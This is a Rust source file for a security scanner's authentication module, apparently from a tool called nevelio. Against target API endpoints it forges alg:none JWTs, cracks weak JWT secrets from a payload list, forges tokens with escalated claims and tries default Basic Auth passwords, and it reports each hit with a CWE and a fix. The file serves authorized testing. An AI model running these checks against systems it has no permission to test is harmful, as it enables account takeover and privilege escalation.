use async_trait::async_trait;
use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use base64::Engine;
use jsonwebtoken::{decode, DecodingKey, Validation};
use serde::Deserialize;

use nevelio_core::types::{Endpoint, Finding, Severity};
use nevelio_core::{AttackModule, HttpClient, ScanSession};

// ---------------------------------------------------------------------------
// Payload definitions (embedded from payloads/jwt.yaml)
// ---------------------------------------------------------------------------

const JWT_PAYLOADS: &str = include_str!("../../../../payloads/jwt.yaml");

const COMMON_BASIC_CREDS: &[(&str, &str)] = &[
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "root"),
    ("admin", "123456"),
    ("test", "test"),
    ("user", "user"),
];

#[derive(Debug, Deserialize)]
struct JwtPayloadFile {
    weak_secrets: Vec<String>,
    claims_to_test: Vec<ClaimTest>,
}

#[derive(Debug, Deserialize)]
struct ClaimTest {
    field: String,
    values: Vec<serde_json::Value>,
}

// ---------------------------------------------------------------------------
// Module
// ---------------------------------------------------------------------------

pub struct AuthModule;

#[async_trait]
impl AttackModule for AuthModule {
    fn name(&self) -> &str {
        "auth"
    }

    fn description(&self) -> &str {
        "Tests JWT (alg:none, weak secrets, claims manipulation), Basic Auth bruteforce, and missing authentication"
    }

    async fn run(
        &self,
        session: &ScanSession,
        client: &HttpClient,
        endpoints: &[Endpoint],
    ) -> Vec<Finding> {
        let mut findings: Vec<Finding> = Vec::new();

        let payload_file: Option<JwtPayloadFile> = serde_yaml::from_str(JWT_PAYLOADS).ok();
        let weak_secrets: Vec<String> = payload_file
            .as_ref()
            .map(|p| p.weak_secrets.clone())
            .unwrap_or_default();
        let claims_to_test: Vec<ClaimTest> = payload_file
            .map(|p| p.claims_to_test)
            .unwrap_or_default();

        let auth_token = session.config.auth_token.clone();
        let jwt_token: Option<String> = auth_token.as_ref().and_then(|t| {
            let stripped = t
                .strip_prefix("Bearer ")
                .or_else(|| t.strip_prefix("bearer "))
                .unwrap_or(t.as_str());
            if is_jwt(stripped) {
                Some(stripped.to_string())
            } else {
                None
            }
        });

        let mut checked_bases = std::collections::HashSet::new();

        for ep in endpoints {
            // --- 1. Missing Authentication ---
            findings.extend(check_unprotected_endpoint(client, ep, &auth_token).await);

            // --- 2. JWT + Basic Auth (once per unique URL to avoid flooding) ---
            if checked_bases.insert(ep.full_url.clone()) {
                if let Some(ref token) = jwt_token {
                    findings.extend(check_jwt_alg_none(client, ep, token).await);

                    let found_secret =
                        check_jwt_weak_secret(client, ep, token, &weak_secrets, &mut findings)
                            .await;

                    if let Some(secret) = found_secret {
                        findings.extend(
                            check_jwt_claims(client, ep, token, &secret, &claims_to_test).await,
                        );
                    }
                }

                findings.extend(check_basic_auth(client, ep).await);
            }
        }

        findings
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn is_jwt_valid_token() {
        // A real HS256 JWT (header.payload.signature)
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\
                     .eyJzdWIiOiIxMjM0In0\
                     .SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
        assert!(is_jwt(token));
    }

    #[test]
    fn is_jwt_rejects_non_jwt() {
        assert!(!is_jwt("Bearer abc123"));
        assert!(!is_jwt("not-a-token"));
        assert!(!is_jwt(""));
        assert!(!is_jwt("only.two"));
    }

    #[test]
    fn forge_alg_none_produces_three_parts() {
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\
                     .eyJzdWIiOiIxMjM0In0\
                     .SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
        let forged = forge_alg_none(token).expect("should produce a token");
        let parts: Vec<&str> = forged.split('.').collect();
        assert_eq!(parts.len(), 3, "JWT must have 3 segments");
        assert!(forged.ends_with('.'), "alg:none token must end with empty signature");
    }

    #[test]
    fn forge_alg_none_preserves_payload() {
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\
                     .eyJzdWIiOiIxMjM0In0\
                     .SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
        let forged = forge_alg_none(token).unwrap();
        let parts: Vec<&str> = forged.split('.').collect();
        let original_parts: Vec<&str> = token.split('.').collect();
        assert_eq!(parts[1], original_parts[1], "payload must be unchanged");
    }

    #[test]
    fn forge_alg_none_rejects_invalid_token() {
        assert!(forge_alg_none("not.valid").is_none());
        assert!(forge_alg_none("").is_none());
    }
}

// ---------------------------------------------------------------------------
// JWT helpers
// ---------------------------------------------------------------------------

fn is_jwt(token: &str) -> bool {
    let parts: Vec<&str> = token.splitn(3, '.').collect();
    if parts.len() != 3 {
        return false;
    }
    if let Ok(decoded) = URL_SAFE_NO_PAD.decode(parts[0]) {
        if let Ok(header) = serde_json::from_slice::<serde_json::Value>(&decoded) {
            return header.get("alg").is_some();
        }
    }
    false
}

fn decode_jwt_claims(token: &str) -> Option<serde_json::Value> {
    jsonwebtoken::dangerous::insecure_decode::<serde_json::Value>(token)
        .ok()
        .map(|d| d.claims)
}

/// Forges a JWT with alg:none and an empty signature.
/// jsonwebtoken v10 refuses to sign Algorithm::None by design, so we build it manually.
fn forge_alg_none(token: &str) -> Option<String> {
    let parts: Vec<&str> = token.splitn(3, '.').collect();
    if parts.len() != 3 {
        return None;
    }
    let none_header = URL_SAFE_NO_PAD.encode(r#"{"alg":"none","typ":"JWT"}"#);
    Some(format!("{}.{}.", none_header, parts[1]))
}

fn forge_signed_token(claims: &serde_json::Value, secret: &str) -> Option<String> {
    use jsonwebtoken::{encode, EncodingKey, Header};
    encode(
        &Header::default(),
        claims,
        &EncodingKey::from_secret(secret.as_bytes()),
    )
    .ok()
}

// ---------------------------------------------------------------------------
// Check: Missing Authentication
// ---------------------------------------------------------------------------

async fn check_unprotected_endpoint(
    client: &HttpClient,
    ep: &Endpoint,
    auth_token: &Option<String>,
) -> Vec<Finding> {
    if !ep.auth_required && auth_token.is_none() {
        return vec![];
    }

    let req = match client
        .inner()
        .request(
            ep.method.parse().unwrap_or(reqwest::Method::GET),
            &ep.full_url,
        )
        .build()
    {
        Ok(r) => r,
        Err(_) => return vec![],
    };

    let Ok(resp) = client.send(req).await else {
        return vec![];
    };

    if resp.status().is_success() {
        let mut f = Finding::new(
            "Missing Authentication".to_string(),
            Severity::Critical,
            9.8,
            "auth".to_string(),
            ep.full_url.clone(),
            ep.method.clone(),
        );
        f.description = format!(
            "The endpoint {} {} is accessible without an Authorization header. \
             Authentication is either absent or not enforced.",
            ep.method, ep.full_url
        );
        f.proof = format!("HTTP {} without credentials", resp.status().as_u16());
        f.recommendation =
            "Require a valid authentication token on all sensitive endpoints.".to_string();
        f.cwe = Some("CWE-306".to_string());
        f.references = vec![
            "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"
                .to_string(),
        ];
        return vec![f];
    }

    vec![]
}

// ---------------------------------------------------------------------------
// Check: JWT alg:none bypass
// ---------------------------------------------------------------------------

async fn check_jwt_alg_none(client: &HttpClient, ep: &Endpoint, token: &str) -> Vec<Finding> {
    let Some(none_token) = forge_alg_none(token) else {
        return vec![];
    };

    let req = match client
        .inner()
        .request(
            ep.method.parse().unwrap_or(reqwest::Method::GET),
            &ep.full_url,
        )
        .header("Authorization", format!("Bearer {}", none_token))
        .build()
    {
        Ok(r) => r,
        Err(_) => return vec![],
    };

    let Ok(resp) = client.send(req).await else {
        return vec![];
    };

    if resp.status().is_success() {
        let mut f = Finding::new(
            "JWT Algorithm None Bypass".to_string(),
            Severity::Critical,
            9.1,
            "auth".to_string(),
            ep.full_url.clone(),
            ep.method.clone(),
        );
        f.description =
            "The server accepted a JWT with algorithm set to \"none\" and an empty signature. \
             An attacker can forge arbitrary tokens without knowing the secret."
                .to_string();
        f.proof = format!(
            "Forged token accepted: {}",
            &none_token[..none_token.len().min(80)]
        );
        f.recommendation =
            "Explicitly reject JWTs where alg is \"none\". Use an allow-list of accepted \
             algorithms and never trust the alg header blindly."
                .to_string();
        f.cwe = Some("CWE-327".to_string());
        f.references = vec![
            "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"
                .to_string(),
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9235".to_string(),
        ];
        return vec![f];
    }

    vec![]
}

// ---------------------------------------------------------------------------
// Check: Weak JWT secret (offline brute force)
// Returns the cracked secret so the caller can run claims checks.
// ---------------------------------------------------------------------------

async fn check_jwt_weak_secret(
    _client: &HttpClient,
    ep: &Endpoint,
    token: &str,
    secrets: &[String],
    findings: &mut Vec<Finding>,
) -> Option<String> {
    for secret in secrets {
        let mut val = Validation::new(jsonwebtoken::Algorithm::HS256);
        val.validate_exp = false;
        val.required_spec_claims = std::collections::HashSet::new();

        if decode::<serde_json::Value>(token, &DecodingKey::from_secret(secret.as_bytes()), &val)
            .is_ok()
        {
            let mut f = Finding::new(
                "Weak JWT Secret".to_string(),
                Severity::High,
                8.8,
                "auth".to_string(),
                ep.full_url.clone(),
                ep.method.clone(),
            );
            f.description =
                "The JWT secret key is trivially guessable. An attacker can forge \
                 valid tokens for any user or role using the discovered secret."
                    .to_string();
            f.proof = format!("Secret cracked: \"{}\"", secret);
            f.recommendation =
                "Use a cryptographically random secret of at least 256 bits. \
                 Rotate immediately and invalidate all existing tokens."
                    .to_string();
            f.cwe = Some("CWE-330".to_string());
            f.references = vec![
                "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"
                    .to_string(),
            ];
            findings.push(f);
            return Some(secret.clone());
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Check: JWT Claims Manipulation (privilege escalation)
// ---------------------------------------------------------------------------

async fn check_jwt_claims(
    client: &HttpClient,
    ep: &Endpoint,
    token: &str,
    secret: &str,
    claims_to_test: &[ClaimTest],
) -> Vec<Finding> {
    let Some(base_claims) = decode_jwt_claims(token) else {
        return vec![];
    };

    let mut findings = Vec::new();

    for claim_test in claims_to_test {
        for value in &claim_test.values {
            let mut modified = base_claims.clone();
            if let Some(obj) = modified.as_object_mut() {
                obj.insert(claim_test.field.clone(), value.clone());
            }

            let Some(forged) = forge_signed_token(&modified, secret) else {
                continue;
            };

            let req = match client
                .inner()
                .request(
                    ep.method.parse().unwrap_or(reqwest::Method::GET),
                    &ep.full_url,
                )
                .header("Authorization", format!("Bearer {}", forged))
                .build()
            {
                Ok(r) => r,
                Err(_) => continue,
            };

            let Ok(resp) = client.send(req).await else {
                continue;
            };

            if resp.status().is_success() {
                let mut f = Finding::new(
                    "JWT Claims Manipulation — Privilege Escalation".to_string(),
                    Severity::High,
                    8.8,
                    "auth".to_string(),
                    ep.full_url.clone(),
                    ep.method.clone(),
                );
                f.description = format!(
                    "Setting the JWT claim \"{}\" to {} granted elevated access to {}. \
                     The server does not validate claims against its own authorization model.",
                    claim_test.field, value, ep.full_url
                );
                f.proof = format!(
                    "Forged claim {{ \"{}\": {} }} → HTTP {}",
                    claim_test.field,
                    value,
                    resp.status().as_u16()
                );
                f.recommendation =
                    "Never trust JWT claims for authorization without server-side verification \
                     against the actual user record. Re-validate roles on every request."
                        .to_string();
                f.cwe = Some("CWE-269".to_string());
                f.references = vec![
                    "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/".to_string(),
                ];
                findings.push(f);
                break; // one finding per claim field is sufficient
            }
        }
    }

    findings
}

// ---------------------------------------------------------------------------
// Check: Basic Auth weak credentials
// ---------------------------------------------------------------------------

async fn check_basic_auth(client: &HttpClient, ep: &Endpoint) -> Vec<Finding> {
    let probe = match client
        .inner()
        .request(
            ep.method.parse().unwrap_or(reqwest::Method::GET),
            &ep.full_url,
        )
        .build()
    {
        Ok(r) => r,
        Err(_) => return vec![],
    };

    let Ok(probe_resp) = client.send(probe).await else {
        return vec![];
    };

    let www_auth = probe_resp
        .headers()
        .get("www-authenticate")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
        .to_lowercase();

    if !www_auth.contains("basic") {
        return vec![];
    }

    for (user, pass) in COMMON_BASIC_CREDS {
        let req = match client
            .inner()
            .request(
                ep.method.parse().unwrap_or(reqwest::Method::GET),
                &ep.full_url,
            )
            .basic_auth(user, Some(pass))
            .build()
        {
            Ok(r) => r,
            Err(_) => continue,
        };

        let Ok(resp) = client.send(req).await else {
            continue;
        };

        if resp.status().is_success() {
            let mut f = Finding::new(
                "Weak Basic Auth Credentials".to_string(),
                Severity::High,
                8.8,
                "auth".to_string(),
                ep.full_url.clone(),
                ep.method.clone(),
            );
            f.description = format!(
                "HTTP Basic Authentication on {} accepts trivial credentials. \
                 An attacker can gain access through a simple dictionary attack.",
                ep.full_url
            );
            f.proof = format!(
                "Login succeeded with {}:{} → HTTP {}",
                user,
                pass,
                resp.status().as_u16()
            );
            f.recommendation =
                "Enforce strong password policies and account lockout. Prefer token-based \
                 authentication (OAuth 2.0 / JWT) over Basic Auth."
                    .to_string();
            f.cwe = Some("CWE-521".to_string());
            f.references = vec![
                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy".to_string(),
            ];
            return vec![f];
        }
    }

    vec![]
}
